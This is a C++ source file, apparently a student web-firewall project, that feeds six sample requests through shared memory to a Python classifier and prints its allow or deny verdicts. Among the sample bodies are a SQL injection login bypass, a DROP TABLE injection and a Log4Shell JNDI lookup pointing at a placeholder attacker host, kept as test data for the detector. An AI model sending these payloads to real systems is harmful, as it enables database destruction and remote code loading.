#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/sem.h>
#include <sys/msg.h>
#include "waf_shm.h"

#define MQ_KEY 0x9ABC

struct MQMessage {
    long mtype;
    char verdict[16];
};

void sem_lock(int semid) {
    struct sembuf op = {0, -1, 0};
    semop(semid, &op, 1);
}
void sem_unlock(int semid) {
    struct sembuf op = {0, 1, 0};
    semop(semid, &op, 1);
}

int main() {
    int shmid = shmget(SHM_KEY, sizeof(WAFCircularBuffer), IPC_CREAT | 0666);
    if (shmid < 0) { perror("shmget"); return 1; }

    int semid = semget(SEM_KEY, 1, IPC_CREAT | 0666);
    if (semid < 0) { perror("semget"); return 1; }
    semctl(semid, 0, SETVAL, 1);

    int mqid = msgget(MQ_KEY, IPC_CREAT | 0666);
    if (mqid < 0) { perror("msgget"); return 1; }

    WAFCircularBuffer *buf = (WAFCircularBuffer *)shmat(shmid, NULL, 0);
    if (buf == (void *)-1) { perror("shmat"); return 1; }

    buf->write_pos = 0;
    buf->read_pos  = 0;
    buf->count     = 0;
    buf->next_request_id = 1;

    std::cout << "WAF Interceptor ready! Writing 6 requests...\n\n";

    const char *payloads[] = {
        "username=john&password=hello123",
        "username=admin' OR '1'='1&password=x",
        "query=weather+in+mumbai",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com/exploit}",
        "search=best+restaurants+near+me"
    };
    const char *uris[] = {
        "/login", "/login", "/search",
        "/search", "/log",  "/search"
    };

    for (int i = 0; i < 6; i++) {
        sleep(1);

        // Write to shared memory
        sem_lock(semid);
        if (buf->count < BUFFER_SIZE) {
            WAFPayload *slot = &buf->slots[buf->write_pos];
            int request_id = buf->next_request_id++;
            slot->ready = 1;
            slot->request_id = request_id;
            strncpy(slot->method, "POST",       sizeof(slot->method));
            strncpy(slot->uri,    uris[i],      sizeof(slot->uri));
            strncpy(slot->body,   payloads[i],  sizeof(slot->body));
            buf->write_pos = (buf->write_pos + 1) % BUFFER_SIZE;
            buf->count++;
            std::cout << "[INTERCEPTED] id=" << request_id << " "
                      << uris[i] << " | " << payloads[i] << "\n";
        }
        sem_unlock(semid);

        // Wait for verdict from Python AI
        MQMessage msg;
        msgrcv(mqid, &msg, sizeof(msg.verdict), buf->next_request_id - 1, 0);
        std::string verdict(msg.verdict);
        verdict = verdict.substr(0, verdict.find('\0'));

        if (verdict == "DENY") {
            std::cout << "  → 🚫 C++ BLOCKING this request!\n\n";
        } else {
            std::cout << "  → ✅ C++ ALLOWING this request.\n\n";
        }
    }

    std::cout << "All requests processed. Week 5-6 complete!\n";
    return 0;
}
